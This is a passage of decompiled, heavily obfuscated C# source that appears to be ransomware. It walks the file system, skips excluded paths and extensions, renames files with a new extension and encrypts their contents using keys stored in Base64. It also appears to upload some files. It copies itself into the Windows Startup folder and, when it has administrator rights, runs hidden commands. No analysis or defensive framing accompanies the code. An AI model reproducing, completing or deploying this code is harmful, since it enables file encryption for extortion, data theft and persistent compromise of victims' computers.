!CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(getString_0(107389521)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(getString_0(107389532)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389507)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389458)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389473)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389424)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389439)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389390)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389405)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389356)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389375)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389322)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(getString_0(107389341)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(getString_0(107388784)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(getString_0(107388799)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(getString_0(107388750)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(SptLhhxIveIbH(getString_0(107388765))) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107388740)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107397156)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107388727)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.EndsWith(FuYKgKQHbtN) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.EndsWith(getString_0(107388702)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.EndsWith(getString_0(107388697)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.EndsWith(getString_0(107388660)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.EndsWith(getString_0(107388655)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107388650)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(UYUhiRtWDRA) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(LtQdcjdFVaR) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(UJdCCmcOabmXjhMvpZ))
			{
				if (IATEnfqjKRGd.Length != 0)
				{
					string[] iATEnfqjKRGd = IATEnfqjKRGd;
					int num = 0;
					while (num < iATEnfqjKRGd.Length)
					{
						string value = iATEnfqjKRGd[num];
						if (!CS_0024_003C_003E8__locals0.dxgicsPAINTY.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_102c;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.dxgicsPAINTY.EndsWith(FuYKgKQHbtN))
					{
						goto IL_102c;
					}
				}
				catch (Exception)
				{
					goto IL_102c;
				}
				if (!rhZfJiziUVZGmK.Contains(CS_0024_003C_003E8__locals0.dxgicsPAINTY))
				{
					if (NTUVpfCRDqR == getString_0(107396906))
					{
						try
						{
							if (FTTifYaMdeudV.DQVZdjxliaL(CS_0024_003C_003E8__locals0.dxgicsPAINTY))
							{
								FTTifYaMdeudV.lsApOpcnkf(CS_0024_003C_003E8__locals0.dxgicsPAINTY);
							}
						}
						catch
						{
						}
					}
					rhZfJiziUVZGmK.Add(CS_0024_003C_003E8__locals0.dxgicsPAINTY);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (vnHLNKxzZjB)
							{
								Console.WriteLine(XqXXZafSRwIHeXM.getString_0(107403199) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + XqXXZafSRwIHeXM.getString_0(107403096) + new FileInfo(CS_0024_003C_003E8__locals0.dxgicsPAINTY).Length + XqXXZafSRwIHeXM.getString_0(107403107));
								Console.WriteLine(XqXXZafSRwIHeXM.getString_0(107403206), rhZfJiziUVZGmK.Count, bTxbPbZzsh, hRbHTMLNoeoN);
								Console.WriteLine(XqXXZafSRwIHeXM.getString_0(107402637), AxBdgXHxeQeZJ.Elapsed);
								Console.WriteLine(XqXXZafSRwIHeXM.getString_0(107403066));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!LcgkciImoRwcI.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.dxgicsPAINTY)))
					{
						LcgkciImoRwcI.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.dxgicsPAINTY));
					}
					UyKwBXYiIu(CS_0024_003C_003E8__locals0.dxgicsPAINTY);
					try
					{
						new yQFjeolKXMd().noDvZcrtQzqfZg(CS_0024_003C_003E8__locals0.dxgicsPAINTY);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.dxgicsPAINTY, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (vnHLNKxzZjB)
								{
									Console.WriteLine(getString_0(107403675) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + getString_0(107403086) + new FileInfo(CS_0024_003C_003E8__locals0.dxgicsPAINTY).Length + getString_0(107403097));
									Console.WriteLine(getString_0(107403056));
								}
							}
							catch
							{
							}
							katTjVhRXIw(SptLhhxIveIbH(getString_0(107402951)), getString_0(107388598) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + getString_0(107388598) + SptLhhxIveIbH(getString_0(107402926)) + getString_0(107388598) + Environment.UserName + getString_0(107388598) + SptLhhxIveIbH(getString_0(107402941)));
						}
					}
					catch (Exception ex2)
					{
						if (ZQkgwClpBNRNGiD)
						{
							try
							{
								File.AppendAllText(LtQdcjdFVaR, getString_0(107387519) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + getString_0(107402916) + ex2.Message + getString_0(107396624));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.dxgicsPAINTY).Length != 0L)
							{
								goto end_IL_0887;
							}
							goto end_IL_0887_2;
							end_IL_0887:;
						}
						catch (Exception ex4)
						{
							if (ZQkgwClpBNRNGiD)
							{
								try
								{
									File.AppendAllText(LtQdcjdFVaR, getString_0(107387519) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + getString_0(107403315) + ex4.Message + getString_0(107396624));
								}
								catch (Exception)
								{
								}
							}
							hRbHTMLNoeoN++;
							goto end_IL_0887_2;
						}
						if (GVzkeDFkkNt == getString_0(107396906) && new FileInfo(CS_0024_003C_003E8__locals0.dxgicsPAINTY).Length > Convert.ToInt32(JRjvEgYWmxeX) * 1024 * 1024)
						{
							try
							{
								if (FuYKgKQHbtN != getString_0(107386728))
								{
									if (IrAGOpnAWTw)
									{
										FuYKgKQHbtN = QgOBOurkDz + FuYKgKQHbtN;
									}
									File.Move(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY + FuYKgKQHbtN);
								}
							}
							catch (Exception ex6)
							{
								if (ZQkgwClpBNRNGiD)
								{
									try
									{
										File.AppendAllText(LtQdcjdFVaR, getString_0(107387519) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + getString_0(107403286) + ex6.Message + getString_0(107396624));
									}
									catch (Exception)
									{
									}
								}
								hRbHTMLNoeoN++;
								return;
							}
							if (FuYKgKQHbtN != getString_0(107386728))
							{
								CS_0024_003C_003E8__locals0.dxgicsPAINTY += FuYKgKQHbtN;
							}
							if (sKNvVrMLVliweTD == getString_0(107396906))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item in fWsOOFrdViRF)
									{
										if (CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.WzuXuFEQNWZh.FuYKgKQHbtN) && bXfvZIqjNkLdMvI == XqXXZafSRwIHeXM.getString_0(107396916))
										{
											if (Convert.ToInt32(CkwHjikrCvdOm) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.dxgicsPAINTY).Length)
											{
												try
												{
													CymodjHxdipp.RDxamUeGvIod(XqXXZafSRwIHeXM.getString_0(107389837), XqXXZafSRwIHeXM.getString_0(107389832), XqXXZafSRwIHeXM.getString_0(107389787), CS_0024_003C_003E8__locals0.dxgicsPAINTY);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().EndsWith(item) && bXfvZIqjNkLdMvI == XqXXZafSRwIHeXM.getString_0(107397026))
										{
											try
											{
												CymodjHxdipp.RDxamUeGvIod(XqXXZafSRwIHeXM.getString_0(107389837), XqXXZafSRwIHeXM.getString_0(107389832), XqXXZafSRwIHeXM.getString_0(107389787), CS_0024_003C_003E8__locals0.dxgicsPAINTY);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(jlwdVcCVDXv);
							if (uuDJEvtSXmqQR == getString_0(107397016))
							{
								byte[] array = null;
								byte[] byte_ = qsVBtPrJSv.onZydZdaURpY(CS_0024_003C_003E8__locals0.dxgicsPAINTY, Convert.ToInt32(JRjvEgYWmxeX) * 1024 * 1024);
								if (!qsVBtPrJSv.lvDlvibtIHl(uqGgpaIFQqSRvN: (!pfmrZzuzgFVdg) ? (yzxmjEHglZqnOW ? qsVBtPrJSv.KiYWDoMxnom(byte_, Convert.FromBase64String(yIgCFYujnVKnghS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qsVBtPrJSv.KiYWDoMxnom(byte_, Convert.FromBase64String(yIgCFYujnVKnghS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (yzxmjEHglZqnOW ? ZJPCkUensbMQ.azaPAsjkpkAz(byte_, Convert.FromBase64String(yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD)) : ZJPCkUensbMQ.azaPAsjkpkAz(byte_, Convert.FromBase64String(yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD))), HnqoYCdHvfu: CS_0024_003C_003E8__locals0.dxgicsPAINTY, yLndxBtngveE: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.dxgicsPAINTY + FuYKgKQHbtN, CS_0024_003C_003E8__locals0.dxgicsPAINTY);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!yzxmjEHglZqnOW)
							{
								if (!zQrrdfdyTPbGA.opNZPDFPzEYow(CS_0024_003C_003E8__locals0.dxgicsPAINTY, JRjvEgYWmxeX, yIgCFYujnVKnghS, null, Convert.FromBase64String(orecqussiUlGJkD)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.dxgicsPAINTY + FuYKgKQHbtN, CS_0024_003C_003E8__locals0.dxgicsPAINTY);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!zQrrdfdyTPbGA.opNZPDFPzEYow(CS_0024_003C_003E8__locals0.dxgicsPAINTY, JRjvEgYWmxeX, yIgCFYujnVKnghS, bytes, Convert.FromBase64String(orecqussiUlGJkD)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.dxgicsPAINTY + FuYKgKQHbtN, CS_0024_003C_003E8__locals0.dxgicsPAINTY);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (IrAGOpnAWTw)
							{
								FuYKgKQHbtN = QgOBOurkDz + FuYKgKQHbtN;
							}
							byte[] bytes2 = Encoding.ASCII.GetBytes(jlwdVcCVDXv);
							if (FuYKgKQHbtN != getString_0(107386728))
							{
								if (!hQdOFpLMvqT)
								{
									if (!yzxmjEHglZqnOW)
									{
										bjDjiXZhvR(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY + FuYKgKQHbtN, RpFQaGTQWAGLZ);
									}
									else
									{
										bjDjiXZhvR(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY + FuYKgKQHbtN, Convert.FromBase64String(yIgCFYujnVKnghS));
									}
								}
								else
								{
									try
									{
										if (!yzxmjEHglZqnOW)
										{
											djVxzdXCmcblm(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY + FuYKgKQHbtN, RpFQaGTQWAGLZ, Convert.FromBase64String(orecqussiUlGJkD));
										}
										else
										{
											djVxzdXCmcblm(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY + FuYKgKQHbtN, Convert.FromBase64String(yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD));
										}
									}
									catch (Exception ex11)
									{
										if (ZQkgwClpBNRNGiD)
										{
											try
											{
												File.AppendAllText(LtQdcjdFVaR, getString_0(107387519) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + getString_0(107386746) + ex11.Message + getString_0(107396624));
											}
											catch (Exception)
											{
											}
										}
										hRbHTMLNoeoN++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.dxgicsPAINTY + FuYKgKQHbtN, CS_0024_003C_003E8__locals0.dxgicsPAINTY);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!hQdOFpLMvqT)
							{
								if (!yzxmjEHglZqnOW)
								{
									bjDjiXZhvR(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY + getString_0(107386755), RpFQaGTQWAGLZ);
								}
								else
								{
									bjDjiXZhvR(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY + getString_0(107386755), Convert.FromBase64String(yIgCFYujnVKnghS));
								}
							}
							else
							{
								try
								{
									if (!yzxmjEHglZqnOW)
									{
										djVxzdXCmcblm(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY, RpFQaGTQWAGLZ, Convert.FromBase64String(orecqussiUlGJkD));
									}
									else
									{
										djVxzdXCmcblm(CS_0024_003C_003E8__locals0.dxgicsPAINTY, CS_0024_003C_003E8__locals0.dxgicsPAINTY, Convert.FromBase64String(yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD));
									}
								}
								catch (Exception ex14)
								{
									if (ZQkgwClpBNRNGiD)
									{
										try
										{
											File.AppendAllText(LtQdcjdFVaR, getString_0(107387519) + CS_0024_003C_003E8__locals0.dxgicsPAINTY + getString_0(107386746) + ex14.Message + getString_0(107396624));
										}
										catch (Exception)
										{
										}
									}
									hRbHTMLNoeoN++;
									return;
								}
							}
							if (yzxmjEHglZqnOW)
							{
								if (FuYKgKQHbtN != getString_0(107386728))
								{
									OGgWAVXoBCZ(CS_0024_003C_003E8__locals0.dxgicsPAINTY + FuYKgKQHbtN, bytes2);
								}
								else
								{
									OGgWAVXoBCZ(CS_0024_003C_003E8__locals0.dxgicsPAINTY, bytes2);
								}
							}
						}
						end_IL_0887_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_102c;
			IL_102c:
			VpbroTtOOIHkJa.Remove(CS_0024_003C_003E8__locals0.dxgicsPAINTY);
		}

		static uNiEyIpSZVz()
		{
			Strings.CreateGetStringDelegate(typeof(uNiEyIpSZVz));
		}
	}

	private sealed class gzGFjyrkaQCbwUn
	{
		public string vybiJPCpzaMZFm;

		public string ZUJWVRuVDljeM;

		public void _003CEncrypt2_003Eb__47()
		{
			while (true)
			{
				try
				{
					File.Delete(vybiJPCpzaMZFm);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__48()
		{
			while (true)
			{
				try
				{
					if (File.Exists(ZUJWVRuVDljeM))
					{
						File.Delete(ZUJWVRuVDljeM);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string vMHyPSsXicyI;

	public static byte[] RpFQaGTQWAGLZ;

	public static string LKrPsTiarBz;

	public static string LvIpIlmDpOjD;

	public static List<string> wHJSEylKjdkFOLFWi;

	public static List<string> CiaEwfNjcm;

	public static string wuzNbmcOypGPCL;

	public static string yIgCFYujnVKnghS;

	public static string orecqussiUlGJkD;

	public static string jlwdVcCVDXv;

	public static string uFQQxUFiYtzqpEYbss;

	public static int ZwjQCxZdcaXUX;

	public static string NTUVpfCRDqR;

	public static string HwzyWmzgIE;

	public static string ihkZZNRjBK;

	public static string ScpbzwtgfaFHFWozM;

	public static string cFSoTIuLWKr;

	public static string sbscusZZHiT;

	public static string xjLolBGBKYVoau;

	public static string CjwWPfqENsIeYmjau;

	public static List<string> ncawYWerEaYkYDX;

	public static List<string> LcgkciImoRwcI;

	public static string oPgwrEPZuxb;

	public static string TkgvcIxppzJbv;

	public static string hfnQyEFrJerR;

	public static List<string> rhZfJiziUVZGmK;

	public static string eLWkimYmNZYZR;

	private static string VbYnGyGPJlPJpn;

	public static string nmBOMxoUYyM;

	public static string sFDrcptQcGEuR;

	public static List<string> RzYwcFFdScf;

	public static List<string> AaIHtfFjZl;

	public static List<string> IqhcicUpaMVzvC;

	public static List<string> ECTKhgSCqzpOmBW;

	public static string ryunUaeaDIkf;

	public static List<string> KWyOQxklyGGI;

	public static List<string> aZmDDBodrmTA;

	public static string dmyCkZHASnYdvy;

	public static string VWoDUyAUFmiJ;

	internal static DateTime fWKtFyaGvNkupbz;

	internal static DateTime MPNgdhcqUJFZl;

	public static string GVzkeDFkkNt;

	public static string JRjvEgYWmxeX;

	public static string vWzJrTKMxwIcuUp;

	public static string MwqYkZpyelSRSS;

	public static string KvahiSqwoL;

	public static string TKaVpogkEkZbLpi;

	public static string ZtLYmAPEakfsPsmxUh;

	public static string sKNvVrMLVliweTD;

	public static List<string> fWsOOFrdViRF;

	public static string bXfvZIqjNkLdMvI;

	public static string CkwHjikrCvdOm;

	public static string meBnMLmhrFsFH;

	public static string tJgAHmIZsWvctlRW;

	public static string LdiQLDQqLnhi;

	public static string bbDDnmCbuvqUmj;

	public static string vdBrBRykSb;

	public static string oAaXkUAavxB;

	public static string ZChFZQXHGBrkq;

	public static string grhpSzhfUFSss;

	public static string vkQWGvhAbRwpa;

	public static string EFccZHcyBMT;

	public static string GIWGhlKkVBAW;

	public static string VssstfCiFT;

	public static string fYeILOmjtQbw;

	public static string wJBBtKlpkZggEx;

	public static string jbCTnNzVBVE;

	public static string oMDpFpituFkZq;

	public static string TnlwwvLILItfDf;

	public static string UYUhiRtWDRA;

	public static string lfAMVeKbACl;

	public static string MSMPEzLLTfd;

	public static string AhZGlKCYOxGTLF;

	public static string yvisaujBtYizEs;

	public static string KRDJkBhvSnRX;

	public static string crxHMHjFYoUuTvI;

	public static string uuDJEvtSXmqQR;

	public static string qJhjufxJQE;

	public static string LEieCFUzyvNdA;

	public static string[] pMwHoMAgFINZw;

	public static string lplqfXwOnNQxi;

	public static bool pfmrZzuzgFVdg;

	public static string GZFAokJxdme;

	public static bool yzxmjEHglZqnOW;

	public static bool HjNtLBoNPGm;

	public static bool pOuGkWaUsdiEVOBeOu;

	public static bool UBvameGFIfHUHT;

	public static string LtQdcjdFVaR;

	public static bool ZQkgwClpBNRNGiD;

	public static bool iKvatpTHICFHVVm;

	public static bool HIJDdIyIdbuuE;

	public static bool grcSOEZMQSYrI;

	public static bool hQdOFpLMvqT;

	public static string UJdCCmcOabmXjhMvpZ;

	public static bool vnHLNKxzZjB;

	public static Stopwatch AxBdgXHxeQeZJ;

	public static int hRbHTMLNoeoN;

	public static int bTxbPbZzsh;

	public static bool IrAGOpnAWTw;

	public static string QgOBOurkDz;

	public static string[] gcPASuKeqCyyaP;

	public static List<string> KIUbIHrPkNfEh;

	public static int hdyuOjhEin;

	public static bool cZSdjZQJVDr;

	public static bool qOScJoSIYFjInN;

	public static bool SWKzsDHRfwh;

	public static bool hazsxBCnQkz;

	public static bool QraByrDhaWPBAswD;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegate25;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool AllocConsole();

	private static void Main(string[] args)
	{
		try
		{
			IPGLRUcjsYXW CS_0024_003C_003E8__locals0 = new IPGLRUcjsYXW();
			CS_0024_003C_003E8__locals0.CYMAvaykPxqnn = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.CYMAvaykPxqnn) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			oVrGVIkTCPC.GimritvBSOn(VbYnGyGPJlPJpn);
		}
		catch (Exception)
		{
		}
		try
		{
			if (crxHMHjFYoUuTvI == getString_0(107396888))
			{
				Thread thread = new Thread(HLiixldCBmzR.kKfDZFMUCgIJD);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (ihkZZNRjBK == getString_0(107396888))
		{
			Thread.Sleep(int.Parse(ScpbzwtgfaFHFWozM));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ZtLYmAPEakfsPsmxUh == getString_0(107396888))
		{
			try
			{
				yZDMBpfHtrBSw(SptLhhxIveIbH(JNNEVbDzfzG(getString_0(107396915))));
			}
			catch
			{
			}
		}
		try
		{
			if (xjLolBGBKYVoau == getString_0(107396888) && DBktMINWgwTV.ZGEBUJGKmnSY())
			{
				new ErCfTxpDFmkPi().AjaSAcVmcrB(bool_0: false);
				DBktMINWgwTV.zKqAAFwRAo();
			}
		}
		catch (Exception)
		{
		}
		if (TkgvcIxppzJbv == getString_0(107396888) && DBktMINWgwTV.ZGEBUJGKmnSY())
		{
			new ErCfTxpDFmkPi().AjaSAcVmcrB(bool_0: false);
			new ErCfTxpDFmkPi().gqOFdaPzQkdPtg();
		}
		if (HwzyWmzgIE == getString_0(107396888))
		{
			QPqYPKarfuYJdps.VKbzhJtoJKlOetQK();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396810);
			string text2 = text + Path.GetFileName(fileName);
			if (uFQQxUFiYtzqpEYbss == getString_0(107396888) && fileName != text2)
			{
				Thread thread2 = new Thread(XZAMCnYpryrjLcE);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (wuzNbmcOypGPCL == getString_0(107396888) && mainModule != null && fileName != text2)
			{
				try
				{
					ZwjQCxZdcaXUX = SGHYiNTJFGr(0, ncawYWerEaYkYDX.Count);
					File.Copy(fileName, text + ncawYWerEaYkYDX[ZwjQCxZdcaXUX], overwrite: true);
					Process.Start(text + ncawYWerEaYkYDX[ZwjQCxZdcaXUX]);
					obiNERLnbtQgNNVVN();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (dmyCkZHASnYdvy == getString_0(107396888) && DateTime.Now < fWKtFyaGvNkupbz)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (VWoDUyAUFmiJ == getString_0(107396888) && DateTime.Now > MPNgdhcqUJFZl)
			{
				obiNERLnbtQgNNVVN();
			}
		}
		catch
		{
		}
		try
		{
			AllocConsole();
			Console.Title = getString_0(107396805);
			if (GIWGhlKkVBAW == getString_0(107396888))
			{
				Console.WriteLine(getString_0(107397147));
			}
			AxBdgXHxeQeZJ.Start();
		}
		catch
		{
		}
		ZeWwDCIIVUC();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> aaIHtfFjZl = AaIHtfFjZl;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						katTjVhRXIw(SptLhhxIveIbH(getString_0(107386675)), string_0);
					};
				}
				Parallel.ForEach(aaIHtfFjZl, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> iqhcicUpaMVzvC = IqhcicUpaMVzvC;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						katTjVhRXIw(SptLhhxIveIbH(getString_0(107386662)), string_0);
					};
				}
				Parallel.ForEach(iqhcicUpaMVzvC, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (LEieCFUzyvNdA == getString_0(107396888))
				{
					string[] source = pMwHoMAgFINZw;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							katTjVhRXIw(SptLhhxIveIbH(getString_0(107386662)), getString_0(107386637) + string_0 + getString_0(107386628));
						};
					}
					Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!zHhLTmoiTGS().Contains(getString_0(107387367)))
				{
					yrRqwumzzMappB(ryunUaeaDIkf);
				}
				else
				{
					List<string> eCTKhgSCqzpOmBW = ECTKhgSCqzpOmBW;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							katTjVhRXIw(SptLhhxIveIbH(JNNEVbDzfzG(getString_0(107386591))), string_0);
						};
					}
					Parallel.ForEach(eCTKhgSCqzpOmBW, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> kWyOQxklyGGI = KWyOQxklyGGI;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						katTjVhRXIw(SptLhhxIveIbH(getString_0(107386598)), string_0);
					};
				}
				Parallel.ForEach(kWyOQxklyGGI, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397138))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397138)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397089)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !wHJSEylKjdkFOLFWi.Contains(text6) && text6 != getString_0(107397100) && text6 != getString_0(107397047) && text6 != getString_0(107397026))
								{
									wHJSEylKjdkFOLFWi.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397029)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107396984))
						{
							GIWGhlKkVBAW = getString_0(107396888);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397007))
						{
							GIWGhlKkVBAW = getString_0(107396998);
						}
					}
					if (text3.Contains(getString_0(107396449)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107396984))
						{
							vnHLNKxzZjB = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397007))
						{
							vnHLNKxzZjB = true;
						}
					}
					if (text3.Contains(getString_0(107396464)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107396984))
						{
							ZQkgwClpBNRNGiD = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397007))
						{
							ZQkgwClpBNRNGiD = false;
						}
					}
					if (text3.Contains(getString_0(107396419)))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107396984))
						{
							cZSdjZQJVDr = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397007))
						{
							cZSdjZQJVDr = false;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (ZQkgwClpBNRNGiD)
			{
				try
				{
					File.AppendAllText(LtQdcjdFVaR, getString_0(107396422) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
